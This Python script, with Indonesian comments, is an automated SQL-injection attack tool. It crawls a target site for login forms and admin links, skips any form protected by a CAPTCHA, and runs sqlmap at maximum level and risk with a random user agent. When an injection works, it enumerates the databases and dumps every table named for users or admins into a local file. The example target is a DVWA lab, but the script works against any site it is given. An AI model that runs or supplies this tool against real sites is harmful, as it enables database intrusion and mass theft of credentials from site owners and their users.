import requests
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import subprocess
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
import json, csv, os

# Konfigurasi
CRAWL_LIMIT = 100
MAX_THREADS = 10
SQLMAP_PATH = "sqlmap"  # Pastikan sqlmap ada di PATH
TARGET_KEYWORDS = ["users", "user", "admin"]

VISITED = set()
URLS_WITH_PARAMS = []  # list of dict {url, data, method, status}

def is_login_page(html):
    soup = BeautifulSoup(html, "html.parser")
    return bool(soup.find("input", {"type": "password"}))

def has_captcha(form):
    html = str(form).lower()
    return "captcha" in html or "g-recaptcha" in html or "h-captcha" in html

def extract_forms(url, html):
    soup = BeautifulSoup(html, "html.parser")
    forms = []
    for form in soup.find_all("form"):
        method = form.get("method", "get").lower()
        if has_captcha(form):
            print(f"[Skip] Form di {url} mengandung CAPTCHA → dilewati")
            URLS_WITH_PARAMS.append({
                "url": url, "data": None, "method": "POST", "status": "skip_captcha"
            })
            continue

        inputs = form.find_all("input")
        has_pass = any(inp.get("type") == "password" for inp in inputs)
        if method == "post" and has_pass:
            action = form.get("action")
            action_url = urljoin(url, action) if action else url
            params = []
            for inp in inputs:
                name = inp.get("name")
                if not name:
                    continue
                if "pass" in name.lower():
                    params.append(f"{name}=*")
                elif "user" in name.lower() or "email" in name.lower():
                    params.append(f"{name}=*")
                else:
                    params.append(f"{name}=test")
            data_str = "&".join(params)
            forms.append({
                "url": action_url, "data": data_str,
                "method": "POST", "status": "pending"
            })
    return forms

def crawl(url, target_domain):
    if len(VISITED) >= CRAWL_LIMIT or url in VISITED:
        return
    try:
        response = requests.get(url, timeout=5)
    except:
        return
    VISITED.add(url)
    print(f"[Crawl] {url}")

    if is_login_page(response.text):
        print(f"[Detect] Halaman login terdeteksi: {url}")
        forms = extract_forms(url, response.text)
        if forms:
            for f in forms:
                print(f"[Form] {f['url']} data={f['data']}")
                URLS_WITH_PARAMS.append(f)

    soup = BeautifulSoup(response.text, "html.parser")
    for link_tag in soup.find_all("a", href=True):
        link = urljoin(url, link_tag["href"])
        parsed = urlparse(link)
        if target_domain in link and link not in VISITED:
            if any(word in link.lower() for word in ["admin", "login", "panel"]):
                if parsed.query:
                    URLS_WITH_PARAMS.append({
                        "url": link, "data": None,
                        "method": "GET", "status": "pending"
                    })
                crawl(link, target_domain)

def test_sqlmap(target):
    url, method, data = target["url"], target["method"], target["data"]
    print(f"\n[+] Uji SQLi: {url} ({method})")

    if method == "POST" and data:
        cmd = [SQLMAP_PATH, "-u", url, "--data", data,
               "--batch", "--level=5", "--risk=3", "--random-agent"]
    else:
        cmd = [SQLMAP_PATH, "-u", url,
               "--batch", "--level=5", "--risk=3", "--random-agent"]

    result = subprocess.run(cmd, capture_output=True, text=True)
    if re.search(r"the back-end DBMS", result.stdout, re.IGNORECASE):
        print(f"[!!!] Rentan SQLi: {url}")
        target["status"] = "vulnerable"
        run_targeted_dump(target)
    else:
        print(f"[-] Tidak rentan: {url}")
        target["status"] = "not_vulnerable"

def run_targeted_dump(target):
    url, method, data = target["url"], target["method"], target["data"]
    print("[*] Dump terbatas (user/admin)...")

    base_cmd = [SQLMAP_PATH, "-u", url, "--batch", "--level=5", "--risk=3", "--threads=10"]
    if method == "POST" and data:
        base_cmd += ["--data", data]

    dbs_cmd = base_cmd + ["--dbs"]
    dbs_result = subprocess.run(dbs_cmd, capture_output=True, text=True)
    databases = re.findall(r"\[\*\] (.+)", dbs_result.stdout)
    if not databases:
        print("[!] Tidak ada database ditemukan.")
        return

    output_file = f"hasil_dump_{urlparse(url).netloc}.txt"
    with open(output_file, "a", encoding="utf-8") as f:
        for db in databases:
            print(f"[DB] {db}")
            tables_cmd = base_cmd + ["-D", db, "--tables"]
            tables_result = subprocess.run(tables_cmd, capture_output=True, text=True)
            tables = re.findall(r"\|\s*(\w+)\s*\|", tables_result.stdout)
            for table in tables:
                if any(k in table.lower() for k in TARGET_KEYWORDS):
                    print(f"[Dump] {db}.{table}")
                    dump_cmd = base_cmd + ["-D", db, "-T", table, "--dump"]
                    dump_result = subprocess.run(dump_cmd, capture_output=True, text=True)
                    print(dump_result.stdout)
                    f.write(dump_result.stdout + "\n")

def save_results(domain):
    json_file = f"hasil_crawl_{domain}.json"
    csv_file = f"hasil_crawl_{domain}.csv"
    with open(json_file, "w", encoding="utf-8") as jf:
        json.dump(URLS_WITH_PARAMS, jf, indent=4, ensure_ascii=False)
    with open(csv_file, "w", newline="", encoding="utf-8") as cf:
        writer = csv.DictWriter(cf, fieldnames=["url", "method", "data", "status"])
        writer.writeheader()
        for row in URLS_WITH_PARAMS:
            writer.writerow(row)
    print(f"\n[✓] Hasil tersimpan: {json_file}, {csv_file}")

def load_results(domain):
    json_file = f"hasil_crawl_{domain}.json"
    if os.path.exists(json_file):
        with open(json_file, "r", encoding="utf-8") as jf:
            return json.load(jf)
    return []

if __name__ == "__main__":
    TARGET = input("Masukkan URL target (contoh: http://localhost/dvwa/): ").strip()
    if not TARGET.startswith("http"):
        print("[!] URL harus diawali http:// atau https://")
        exit()

    TARGET_DOMAIN = urlparse(TARGET).netloc

    # Cek apakah sudah ada hasil lama
    old_results = load_results(TARGET_DOMAIN)
    if old_results:
        print(f"[*] Resume dari hasil sebelumnya ({len(old_results)} target).")
        URLS_WITH_PARAMS = old_results
    else:
        print("[*] Mulai crawling baru...")
        crawl(TARGET, TARGET_DOMAIN)

    print(f"\n[!] Total target ditemukan: {len(URLS_WITH_PARAMS)}")

    # Jalankan test hanya untuk pending
    pending_targets = [t for t in URLS_WITH_PARAMS if t["status"] == "pending"]
    print(f"[*] Mulai pengujian {len(pending_targets)} target pending...")

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = [executor.submit(test_sqlmap, target) for target in pending_targets]
        for future in as_completed(futures):
            future.result()

    save_results(TARGET_DOMAIN)
    print("\n[✓] Proses selesai. Bisa resume lagi nanti kalau dihentikan.")
